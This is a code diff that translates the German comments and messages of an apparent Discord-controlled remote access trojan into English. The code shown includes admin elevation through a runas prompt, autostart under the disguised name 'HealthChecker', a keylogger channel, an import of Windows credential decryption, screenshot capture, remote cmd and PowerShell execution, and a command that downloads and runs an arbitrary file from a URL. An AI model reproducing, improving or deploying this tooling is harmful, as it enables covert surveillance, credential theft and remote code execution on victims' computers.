@@ -1,9 +1,9 @@
-# Ersetzen Sie dies durch Ihr Bot-Token
+# Replace this with your bot token
 TOKEN = "YOUR_BOT_TOKEN"
 
 GUILD_ID = YOUR_GUILD_ID
 
-# Ersetzen Sie dies durch Ihre Discord-Benutzer-ID(s), die den Bot steuern dürfen
+# Replace this with your Discord user ID(s) that are allowed to control the bot
 AUTHORIZED_USERS = [YOUR_USER_ID]
 
 import asyncio
@@ -55,9 +55,7 @@ from pynput import keyboard, mouse
 from pynput.keyboard import Key, Listener
 from win32crypt import CryptUnprotectData
 
-admin_status_file = (
-    "admin_status.txt"  # Füge diese Zeile hinzu, um die Variable zu definieren
-)
+admin_status_file = "admin_status.txt"
 
 # Dictionary to store the current process for each user
 user_sessions = {}
@@ -67,18 +65,18 @@ intents.message_content = True
 intents.voice_states = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-current_paths = {}  # Speichert den aktuellen Pfad für jeden Benutzer
-is_admin = False  # Variable zur Überprüfung der Admin-Rechte
+current_paths = {}  # Stores the current path for each user
+is_admin = False  # Variable to check admin rights
 
 SERVICE_NAME = "HealthChecker"
 SCRIPT_PATH = os.path.abspath(sys.argv[0])
 AUTOSTART_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 AUTOSTART_NAME = "HealthChecker"
 
-# Erhalte das temporäre Verzeichnis des Systems
+# Get the system's temporary directory
 temp_dir = tempfile.gettempdir()
 
-# URL des Rickroll-Videos
+# Rickroll URL
 VIDEO_URL = "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/RickRoll.mp4"
 VIDEO_PATH = os.path.join(temp_dir, "rickroll.mp4")
 
@@ -146,56 +144,56 @@ def check_if_admin():
 
 def elevate():
     try:
-        # Prüfen, ob bereits Admin-Rechte vorhanden sind
+        # Check if admin rights are already present
         if check_if_admin():
-            raise Exception("Der Prozess hat bereits Admin-Rechte.")
+            raise Exception("The process already has admin rights.")
 
         script = os.path.abspath(sys.argv[0])
         script_ext = os.path.splitext(script)[1].lower()
 
         if script_ext == ".exe":
-            # Falls die Datei eine .exe ist, direkt ausführen
+            # If the file is an .exe, run it directly
             command = f'"{script}"'
         else:
-            # Falls die Datei eine .py ist, Python-Interpreter verwenden
+            # If the file is a .py, use the Python interpreter
             command = f'"{sys.executable}" "{script}"'
 
-        # Starte das Skript als Administrator neu über cmd, führe das Skript aus, warte 7 Sekunden und schließe dann das Fenster
+        # Restart the script as administrator via cmd, run the script, wait 7 seconds and close the window
         result = ctypes.windll.shell32.ShellExecuteW(
             None, "runas", "cmd.exe", f"/k {command} & timeout /t 7 & exit", None, 1
         )
 
-        if result > 32:  # Erfolg
-            return True  # Neustart erfolgreich initiiert
+        if result > 32:  # Success
+            return True  # Restart successfully initiated
         else:
-            raise Exception("Fehler beim Neustarten des Skripts mit Admin-Rechten.")
+            raise Exception("Error restarting the script with admin rights.")
     except Exception as e:
-        raise Exception(f"Fehler beim Anfordern von Admin-Rechten: {str(e)}")
+        raise Exception(f"Error requesting admin rights: {str(e)}")
 
 
 def check_single_instance():
-    # Verwende das temporäre Verzeichnis des Systems für die PID-Datei
+    # Use the system's temporary directory for the PID file
     temp_dir = tempfile.gettempdir()
     pid_file = os.path.join(temp_dir, "script_instance.pid")
 
-    # Überprüfen, ob die PID-Datei existiert
+    # Check if the PID file exists
     if os.path.exists(pid_file):
         with open(pid_file, "r") as f:
             pid = int(f.read())
-            # Überprüfen, ob der Prozess mit der gespeicherten PID noch läuft
+            # Check if the process with the stored PID is still running
             if psutil.pid_exists(pid):
-                print("Eine Instanz des Skripts läuft bereits.")
+                print("An instance of the script is already running.")
                 sys.exit(0)
             else:
                 print(
-                    "Gefundene PID-Datei, aber Prozess läuft nicht mehr. Überschreibe PID-Datei."
+                    "PID file found, but process is no longer running. Overwriting PID file."
                 )
 
-    # Schreibe die aktuelle PID in die PID-Datei
+    # Write the current PID to the PID file
     with open(pid_file, "w") as f:
         f.write(str(os.getpid()))
 
-    # Registriere eine Funktion, um die PID-Datei beim Beenden des Skripts zu entfernen
+    # remove the PID file when the script exits
     def remove_pid_file():
         if os.path.exists(pid_file):
             os.remove(pid_file)
@@ -214,10 +212,10 @@ async def on_ready():
         existing_channel = discord.utils.get(guild.channels, name=sanitized_name)
         if not existing_channel:
             channel = await guild.create_text_channel(sanitized_name)
-            print(f'Channel "{sanitized_name}" wurde erstellt')
+            print(f'Channel "{sanitized_name}" was created')
         else:
             channel = existing_channel
-            print(f'Channel "{sanitized_name}" existiert bereits')
+            print(f'Channel "{sanitized_name}" already exists')
 
         load_keylogger_status()
         keylogger_channel_name = f"{sanitized_name}-keylogger"
@@ -236,11 +234,11 @@ async def on_ready():
         await channel.send(f"Bot is now online! {current_time}")
 
     else:
-        print("Guild nicht gefunden")
-    load_admin_status()  # Laden des Admin-Status beim Start
+        print("Guild not found")
+    load_admin_status()  # Load admin status at startup
 
 
-# Entfernen des Standard-help-Befehls
+# Remove the default help command
 bot.remove_command("help")
 
 
@@ -300,11 +298,11 @@ async def generic_command_error(ctx, error):
 async def purge(ctx):
     try:
         deleted = await ctx.channel.purge(limit=200, check=is_bot_or_command)
-        await log_message(ctx, f"{len(deleted)} Nachrichten gelöscht.", duration=5)
+        await log_message(ctx, f"{len(deleted)} messages deleted.", duration=5)
     except Exception as e:
         await log_message(
             ctx,
-            f"Fehler beim Löschen von Bot-Nachrichten und Befehlen: {e}",
+            f"Error deleting bot messages and commands: {e}",
             duration=5,
         )
 
@@ -317,7 +315,7 @@ async def ping(ctx):
         return
 
     latency = round(bot.latency * 1000)
-    await log_message(ctx, f"🏓 Pong! Latenz: {latency}ms")
+    await log_message(ctx, f"🏓 Pong! Latency: {latency}ms")
 
 
 @bot.command()
@@ -333,10 +331,10 @@ async def screenshot(ctx):
         screenshot = pyautogui.screenshot()
         screenshot.save(screenshot_path)
         await ctx.send(file=discord.File(screenshot_path))
-        await log_message(ctx, "Screenshot erstellt und gesendet.")
+        await log_message(ctx, "Screenshot created and sent.")
         os.remove(screenshot_path)
     except Exception as e:
-        await log_message(ctx, f"Fehler beim Erstellen des Screenshots: {str(e)}")
+        await log_message(ctx, f"Error creating screenshot: {str(e)}")
 
 
 @bot.command()
@@ -381,12 +379,12 @@ async def cmd(ctx, *, command):
             await ctx.send(f"```{chunk}```")  # Send each chunk wrapped in a code block
 
         # Log the executed command
-        await log_message(ctx, f"CMD-Befehl ausgeführt: {command}")
+        await log_message(ctx, f"CMD command executed: {command}")
 
     except discord.errors.HTTPException as e:
-        await log_message(ctx, f"Fehler bei der Ausführung des Befehls: {str(e)}")
+        await log_message(ctx, f"Error executing command: {str(e)}")
     except Exception as e:
-        await log_message(ctx, f"Fehler bei der Ausführung des Befehls: {str(e)}")
+        await log_message(ctx, f"Error executing command: {str(e)}")
     finally:
         try:
             await working_message.delete()
@@ -438,7 +436,7 @@ async def powershell(ctx, *, command):
             await ctx.send(f"```{chunk}```")
 
         # Log successful execution
-        await log_message(ctx, f"PowerShell-Befehl ausgeführt: {command}")
+        await log_message(ctx, f"PowerShell command executed: {command}")
 
     except Exception as e:
         # Handle errors and clean up the working message
@@ -446,7 +444,7 @@ async def powershell(ctx, *, command):
             await working_message.delete()
         except discord.errors.NotFound:
             pass
-        await log_message(ctx, f"Fehler bei der Ausführung des Befehls: {str(e)}")
+        await log_message(ctx, f"Error executing command: {str(e)}")
 
 
 @bot.command()
@@ -532,7 +530,7 @@ async def execute(ctx, url):
     try:
         filename = url.split("/")[-1]
 
-        # Temporären Ordner erstellen
+        # Create a temporary folder
         temp_dir = tempfile.gettempdir()
         temp_filepath = os.path.join(temp_dir, filename)
 
@@ -542,7 +540,7 @@ async def execute(ctx, url):
                     async with aiofiles.open(temp_filepath, mode="wb") as f:
                         await f.write(await resp.read())
 
-                    # Start der Datei im temporären Ordner
+                    # Start the file in the temporary folder
                     if is_admin:
                         subprocess.Popen(
                             temp_filepath,
@@ -559,18 +557,14 @@ async def execute(ctx, url):
                     await working_message.delete()
                     await log_message(
                         ctx,
-                        f"{filename} wurde heruntergeladen und in einem neuen Prozess gestartet.",
+                        f"{filename} was downloaded and started in a new process.",
                     )
                 else:
                     await working_message.delete()
-                    await log_message(
-                        ctx, f"Fehler beim Herunterladen der Datei: {resp.status}"
-                    )
+                    await log_message(ctx, f"Error downloading file: {resp.status}")
     except Exception as e:
         await working_message.delete()
-        await log_message(
-            ctx, f"Fehler beim Herunterladen und Ausführen der Datei: {str(e)}"
-        )
+        await log_message(ctx, f"Error downloading and executing file: {str(e)}")
 
 
 @bot.command()
@@ -592,9 +586,9 @@ async def system_info(ctx):
         Processor: {uname.processor}
         """
         await ctx.send(sys_info)
-        await log_message(ctx, "Systeminformationen abgerufen.")
+        await log_message(ctx, "System information retrieved.")
     except Exception as e:
-        await log_message(ctx, f"Fehler beim Abrufen der Systeminformationen: {str(e)}")
+        await log_message(ctx, f"Error retrieving system information: {str(e)}")
 
 
 @bot.command()
